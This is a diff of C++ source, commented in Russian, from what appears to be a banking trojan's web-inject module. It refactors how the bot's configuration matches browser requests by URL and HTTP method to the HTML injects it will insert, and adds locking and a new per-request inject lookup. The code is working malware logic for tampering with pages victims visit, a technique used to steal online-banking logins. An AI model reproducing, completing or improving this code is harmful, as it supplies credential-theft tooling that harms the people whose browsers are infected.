@@ -482,53 +482,25 @@ bool ConfigDoGetInjectsForRequest(TBotConfig* BotConfig, PRequest Request) {
 }
 //----------------------------------------------------------------------------
 
-//bool Config::GetInjectsForRequest(PRequest Request) {
-//
-//	if (Request == NULL || STR::IsEmpty(Request->URL))
-//		return false;
-//
-//	// Инициализируем конфигурационный файл
-//	TBotConfig* BotConfig = Config::GetConfig();
-//	if (BotConfig == NULL)
-//		return false;
-//
-//	pEnterCriticalSection(&BotConfig->Lock);
-//
-//    CheckConfigUpdates(BotConfig);
-//
-//	bool Result = ConfigDoGetInjectsForRequest(BotConfig, Request);
-//
-//	pLeaveCriticalSection(&BotConfig->Lock);
-//
-//	return Result;
-//}
+bool Config::GetInjectsForRequest(PRequest Request)
+{
+	TBotConfig* Config = GetConfig();
+	if (Config)
+		return Config->HTMLInjects->GetInjectsForRequest(Request);
+	else
+		return false;
+}
+
 // ----------------------------------------------------------------------------
 
 bool Config::IsInjectURL(PCHAR URL, THTTPMethod Method)
 {
 	// Функция проверяет есть ли для указанного адреса инжект
-	if (STR::IsEmpty(URL))
+	TBotConfig* Config = GetConfig();
+	if (Config)
+		return Config->HTMLInjects->IsInjectURL(URL);
+	else
 		return false;
-
-	DWORD Count = BotConfig->HTMLInjects->Count();
-
-	for (DWORD i = 0; i < Count; i++)
-	{
-		THTMLInject *Inject = BotConfig->HTMLInjects->Items(i);
-
-		if (Inject->Disabled)
-			continue;
-
-		// Сравниваем методы и ссылки
-		if ((Method == hmGET && Inject->GET) ||
-			(Method == hmPOST && Inject->POST))
-			if (CompareUrl(Inject->URL.t_str(), URL))
-			{
-				return true;
-			}
-	}
-
-    return false;
 }
 //----------------------------------------------------------------------------
 
@@ -1130,7 +1102,8 @@ void THTMLInjectList::ReleaseInjects(PList Injects)
 	if (!Injects) return;
 
 
-    Lock();
+	TLock Lock(&FLock);
+
 
 	for (DWORD i = List::Count(Injects); i > 0; i--)
 	{
@@ -1146,7 +1119,6 @@ void THTMLInjectList::ReleaseInjects(PList Injects)
 
 	List::Clear(Injects);
 
-	Unlock();
 }
 
 
@@ -1159,45 +1131,72 @@ bool THTMLInjectList::GetInjectsForURL(THTTPMethod Method, const char *URL, PLis
 
     bool Result = false;
 
+	// Входим в критическую секцию
+	TLock Lock(&FLock);
+
+	//-----------------------------
+
 	DWORD Cnt = Count();
 	for (DWORD i = 0; i < Cnt; i++)
 	{
 		THTMLInject *Inject = Items(i);
 
+		if (Inject->Disabled) continue;
 
-		if (Inject->Disabled)
-			continue;
+		// Сравниваем метод
+		if (Method != hmUnknown)
+		{
+			bool Valid = (Method == hmGET && Inject->GET ||
+						  Method == hmPOST && Inject->POST);
+			if (!Valid) continue;
+		}
 
-		// Сравниваем методы и ссылки
-		if (Method == hmGET && Inject->GET || Method == hmPOST && Inject->POST)
+		// Сравниваем адреса
+		if (CompareUrl(Inject->URL.t_str(),  URL))
+		{
+			Result = true;
 
-			if (CompareUrl((PCHAR)Inject->URL.t_str(), (PCHAR)URL))
-			{
-				Result = true;
+			// Проверяется на наличие инжекта для данного адреса
+			if (List == NULL) break;
 
-				// Проверяется на наличие инжекта для данного адреса
-				if (List == NULL) break;
+			// Добавляем в список
+			Inject->Used = true;
 
-				// Добавляем в список
-				Inject->Used = true;
-
-				#ifdef BV_APP
-					CallHTMLInjectEvent(Inject, injMaskFinded, NULL);
-				#endif
-
-				#ifdef BOTMONITOR
-					BotMonitor::SendMessage((PCHAR)BotMonitor::ConfigMaskExec, (PCHAR)&Inject->ID, sizeof(Inject->ID));
-				#endif
-
-
-				List::Add(List, Inject);
-				Inject->RefCount++; // Увеличиваем счётчик использований инжекта
-			}
+			List::Add(List, Inject);
+			Inject->RefCount++; // Увеличиваем счётчик использований инжекта
+		}
 	}
+
 
 	return Result;
 }
 
+
+// Функция возвращает инжекты для запроса
+bool THTMLInjectList::GetInjectsForRequest(PRequest Request)
+{
+	if (!Request) return false;
+
+	if (Request->Injects)
+		List::Clear(Request->Injects);
+	else
+		Request->Injects = List::Create();
+
+	// Получаем инжекты адреса
+	Request->IsInject = GetInjectsForURL(Request->Method, Request->URL, Request->Injects);
+	if (!Request->IsInject)
+	{
+		List::Free(Request->Injects);
+		Request->Injects = NULL;
+	}
+    return Request->IsInject;
+}
+
+// Функция возвращает истину если для указанного адреса есть инжекты
+bool THTMLInjectList::IsInjectURL(const char* URL, THTTPMethod Method)
+{
+	return GetInjectsForURL(Method, URL, NULL);
+}
 
 
 //*****************************************************************************
@@ -1316,3 +1315,5 @@ bool TBotConfig::LoadFromFile(const string &FileName)
 	// Освобождаем память
 	MemFree(Buf);
 }
+
+
